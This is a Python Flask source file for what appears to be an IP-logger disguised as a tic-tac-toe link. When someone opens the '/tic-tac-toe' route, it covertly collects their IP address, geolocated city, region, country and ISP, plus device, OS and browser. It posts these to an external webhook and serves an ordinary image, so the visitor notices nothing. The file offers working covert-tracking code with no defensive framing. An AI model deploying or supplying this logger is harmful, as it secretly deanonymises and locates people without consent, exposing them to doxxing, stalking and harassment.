import os
import requests
from flask import Flask, request, Response, redirect
from utils import get_ip_info, parse_user_agent

app = Flask(__name__)
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP3C9B_ASgVH1eKGNgCyx9YiTUF_3o0yEKrA7g7aerzizSD_N594ajvHqN&s=10"

def send_webhook(data):
    if not WEBHOOK_URL:
        return
    try:
        embed = {
            "embeds": [{
                "title": "🕵️ Image Click Logged",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP", "value": data.get("ip", "N/A"), "inline": True},
                    {"name": "City", "value": data.get("city", "N/A"), "inline": True},
                    {"name": "State", "value": data.get("region", "N/A"), "inline": True},
                    {"name": "Country", "value": data.get("country", "N/A"), "inline": True},
                    {"name": "ISP", "value": data.get("isp", "N/A"), "inline": True},
                    {"name": "Device", "value": data.get("device", "N/A"), "inline": True},
                    {"name": "OS", "value": data.get("os", "N/A"), "inline": True},
                    {"name": "Browser", "value": data.get("browser", "N/A"), "inline": True},
                ],
                "footer": {"text": "Security Log"}
            }]
        }
        requests.post(WEBHOOK_URL, json=embed)
    except Exception:
        pass

@app.route('/tic-tac-toe')
def tic_tac_toe():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    geo = get_ip_info(ip)
    ua = request.headers.get('User-Agent', '')
    device_info = parse_user_agent(ua)
    send_webhook({
        "ip": ip,
        "city": geo.get("city", "Unknown"),
        "region": geo.get("regionName", "Unknown"),
        "country": geo.get("country", "Unknown"),
        "isp": geo.get("isp", "Unknown"),
        "device": device_info.get("device", "Unknown"),
        "os": device_info.get("os", "Unknown"),
        "browser": device_info.get("browser", "Unknown"),
    })
    try:
        resp = requests.get(IMAGE_URL, stream=True)
        return Response(resp.raw.read(), content_type=resp.headers['content-type'])
    except:
        return redirect(IMAGE_URL)

@app.route('/')
def home():
    return "Tic-Tac-Toe Logger Online"

if __name__ == '__main__':
    app.run()
